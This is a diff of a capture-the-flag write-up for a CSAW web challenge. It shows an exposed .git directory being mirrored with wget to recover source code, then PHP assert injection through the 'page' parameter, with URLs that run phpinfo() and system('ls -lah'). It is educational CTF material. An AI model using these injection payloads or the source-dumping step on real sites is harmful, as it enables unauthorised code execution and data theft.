@@ -21,14 +21,14 @@ I used:
 From the html source code, we can see that there is a hidden flag.php page:
 ![screen shot](https://cloud.githubusercontent.com/assets/22091364/18804797/22dd372c-81ce-11e6-96b0-a034f3d2d970.jpg)
 
-The website author also hints that he used the above sources to create the website. A quick check of the challenge website reveals that they used github as the source control repository. We can use the publically exposed .git/ directory to retreive the website source code:
+The website author also hints that he used the above sources to create the website. A quick check of the challenge website reveals that they used GitHub as the source control repository. We can use the publically exposed .git/ directory to retreive the website source code:
 
     http://web.chal.csaw.io:8000/.git/
 
 Information security professionals warn that publicly revealing a website's source code leaves it open to vulnerabilities (https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/).
 
 We can use this publically exposed .git/ directory to retreive the website source code.
-We used `wget` to download that .git/ directory (or use curl for Mac users):
+We used the `wget` command, we downloaded the .git/ directory (or use curl for Mac users):
 
     wget --mirror -I .git http://web.chal.csaw.io:8000/.git/
 ---
@@ -47,9 +47,9 @@ Which retrieves the following file statuses:
     deleted:    templates/home.php
 ---
 
-we ran `git checkout -- ` to obtain the source files from the git repo
+We ran `git checkout -- ` to obtain the source files from the git repo>
 
-Next, we looked  at the current files in the directory:
+Next, we look at the current files in the directory by:
 
     $ ls
 
@@ -59,7 +59,7 @@ Which shows that the following files exist:
     templates
 ---
 
-We examined the index.php file and found that it used assert. We also discovered that the $file variable is created from unchecked user input, namely the $_GET['page']. We can use $file to command inject the assert statement.
+We examined the index.php file and found that it used `assert`. We also discovered that the `$file` variable is created from unchecked user input, namely the `$_GET['page']`. We can use `$file` to command inject the `assert` statement.
 
     <?php
 
@@ -74,13 +74,13 @@ We examined the index.php file and found that it used assert. We also discovered
     ?>
 
 Per aaraonasterling on StackOverflow: 
->The rule of thumb which is applicable across most languages (all that I vaguely know) is that an assert is used to assert that a >condition is always true whereas an if is appropriate if it is conceivable that it will sometimes fail. (http://stackoverflow.com/questions/4516419/should-i-be-using-assert-in-my-php-code#4516444)
+>The rule of thumb which is applicable across most languages (all that I vaguely know) is that an `assert` is used to assert that a >condition is always true whereas an `if` is appropriate if it is conceivable that it will sometimes fail. (http://stackoverflow.com/questions/4516419/should-i-be-using-assert-in-my-php-code#4516444)
 
 With this in mind, we knew the way to capture the flag was to use `assert` to our advantage. First we tried some system commands through the browser, such as `http://web.chal.csaw.io:8000/?page=home%27!=0);//` and retrieved the "Detected hacking attempt!" web page.
 
 ---    
 
-Next we pulled up the phpinfo page by injecting by typing in the following commands into the browser window:
+Next we pulled up the phpinfo page by injecting by the following command into the browser window:
 
     http://web.chal.csaw.io:8000/?page=home%27).%20phpinfo();%20//
 
@@ -88,11 +88,11 @@ Which retrieved all of the information and configuration of the website:
 
 ![screen shot](https://cloud.githubusercontent.com/assets/22091364/18820566/aebaa8c0-836c-11e6-949e-5bfa89b3cade.jpg)
 
-Success! we have injected the phpinfo(); command into the script sources on the live web page.
+Success! we have injected the `phpinfo();` command into the script sources on the live web page.
 
 ---
 
-We then tried the `system()` call to launch commands on the machine and then We tried the `ls` command to list the directory contents with `view-source:http://web.chal.csaw.io:8000/?page=home%27).%20system(%22ls%20-lah%22);%20//`:
+We then tried the `system()` call to launch commands on the machine and the `ls` command to list the directory contents with `http://web.chal.csaw.io:8000/?page=home%27).%20system(%22ls%20-lah%22);%20//`:
 
 ![screen shot](https://cloud.githubusercontent.com/assets/22091364/18804401/47677144-81c8-11e6-9b6a-e766fa952723.png)
 
